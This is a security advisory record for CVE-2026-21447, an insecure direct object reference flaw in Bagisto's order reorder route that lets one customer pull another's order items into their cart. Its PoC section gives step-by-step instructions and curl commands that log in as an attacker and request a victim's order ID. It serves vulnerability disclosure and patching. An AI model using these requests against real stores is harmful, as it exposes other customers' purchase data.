advisory_id: GHSA-x5rw-qvvp-5cgm
datasource_id: github_osv_importer_v2/GHSA-x5rw-qvvp-5cgm
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-x5rw-qvvp-5cgm/GHSA-x5rw-qvvp-5cgm.json
aliases:
  - CVE-2026-21447
summary: |
  Bagisto has IDOR in Customer Order Reorder Functionality
  ### Summary

  An Insecure Direct Object Reference vulnerability in the customer order reorder function allows any authenticated customer to add items from another customer's order to their own shopping cart by manipulating the order ID parameter. This exposes sensitive purchase information and enables potential fraud.

  ### Details

  The vulnerability exists in the reorder method within OrderController.php. Unlike other order-related functions like view, cancel, printInvoice that properly validate customer ownership, the reorder function retrieves orders using only the order ID without verifying that the order belongs to the authenticated customer.

  Code location: `packages/Webkul/Shop/src/Http/Controllers/Customer/Account/OrderController.php`

  Exposed Route: `packages/Webkul/Shop/src/Routes/customer-routes.php`

  ```php
  Route::get('reorder/{id}', 'reorder')->name('shop.customers.account.orders.reorder');
  ```

  ### PoC

  I. Create victim account and place an order.
  II. Login as attacker.
  III. Exploit IDOR and navigate like:  http://target.xxx/customer/account/orders/reorder/1
  IV. Check http://target.xxx/checkout/cart and verify exploitation.
  V. Victim's order items are now in Attacker's cart.

  ###Â PoC via curl:

  ```
  curl -c cookies.txt -X POST "http://target.xxx/customer/login" -d "email=attacker@evil.com&password=123qwe"

  curl -b cookies.txt "http://target.xxx/customer/account/orders/reorder/1"

  curl -b cookies.txt "http://target/api/checkout/cart"
  ```

  ### Impact

  - **Information Disclosure:** Attackers can discover what products other customers have purchased.
  - **Potential Fraud:** Attackers could potentially exploit this for social engineering or targeted attacks.
impacted_packages:
  - purl: pkg:composer/bagisto/bagisto
    affected_versions: vers:composer/<2.3.10
    fixed_versions: vers:composer/2.3.10
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-x5rw-qvvp-5cgm/GHSA-x5rw-qvvp-5cgm.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-284
  - CWE-639
references:
  - url: https://github.com/bagisto/bagisto
    reference_type:
    reference_id:
  - url: https://github.com/bagisto/bagisto/commit/b2b1cf62577245d03a68532478cffbe321df74d3
    reference_type:
    reference_id:
  - url: https://github.com/bagisto/bagisto/security/advisories/GHSA-x5rw-qvvp-5cgm
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-21447
    reference_type:
    reference_id:
